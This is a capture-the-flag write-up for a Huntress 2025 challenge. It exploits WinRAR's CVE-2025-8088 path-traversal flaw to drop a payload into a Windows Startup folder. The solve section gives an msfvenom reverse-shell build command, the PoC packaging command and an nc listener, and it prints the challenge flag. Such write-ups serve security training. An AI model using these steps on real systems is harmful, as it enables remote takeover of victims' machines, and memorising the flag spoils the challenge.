---
title: "Threat Actor Support Line"
date: 2025-11-26
categories:
  - Huntress
tags:
  - "Miscellaneous"
  - "2025"
  - "CVE Exploit"
  - "WinRAR (CVE-2025-8088)"
platform: Huntress 2025
competition_year: 2025
header:
  teaser: /assets/images/teasers/ctf.png
toc: true
toc_sticky: true
---

# 📦 Threat Actor Support Line

|Category         |	Author                |
|-----------------|-----------------------|
|📦 Miscellaneous |John Hammond           |

## Challenge Prompt

You've heard of RaaS, you've heard of SaaS... the Threat Actor Support Line brings the two together!

Upload the files you want encrypted, and the service will start up its own hacker computer 
(as the Administrator user with antivirus disabled, of course) and encrypt them for you!

## Problem Type
- CVE Exploit
- WinRAR (CVE-2025-8088)

## Solve
Noticed the page said it was using WinRAR version 7.12.

Found CVE-2025-8088 effects that version.

Got python PoC for CVE-2025-8088 from GitHub:
- [CVE-2025-8088](https://github.com/sxyrxyy/CVE-2025-8088-WinRAR-Proof-of-Concept-PoC-Exploit-)

Built reverse TCP shell with msfvenom:
```bash
msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=<IP> LPORT=7777 -o ~\Downloads\payload.exe
```

Made a `hello.txt` file that just said `Hello!`.

Packaged up using the PoC Python (must do on Windows):
```cmd
python .\poc.py --decoy .\hello.txt --payload .\payload.exe --drop 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
```

We start a listener on our machine 
```bash
nc -lvnp 7777
```
Uploaded .rar file to box

We get a connection back and we find the flag in C:\ and we read it with more flag.txt.


## Flag
`flag{6529440ceec226f31a3b2dc0d0b06965}`


<p align="right">(<a href="#top">back to top</a>)</p>
